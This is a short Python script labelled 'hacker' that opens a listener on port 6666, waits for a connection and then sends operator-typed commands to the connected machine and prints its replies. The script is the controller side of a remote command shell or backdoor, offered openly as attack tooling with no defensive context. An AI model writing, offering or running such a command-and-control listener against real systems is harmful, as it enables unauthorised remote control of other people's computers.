# hacker
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((socket.gethostbyname(socket.gethostname()),6666))
s.listen(1)
a, c=s.accept()
print("connected to " + str(a) + "\n" + str(c))
while True:
    command=input(str("#> "))
    if(command!=""):
        try:
            command
            a.send(command.encode())
        except: pass
    re=a.recv(2000).decode()
    print(re)
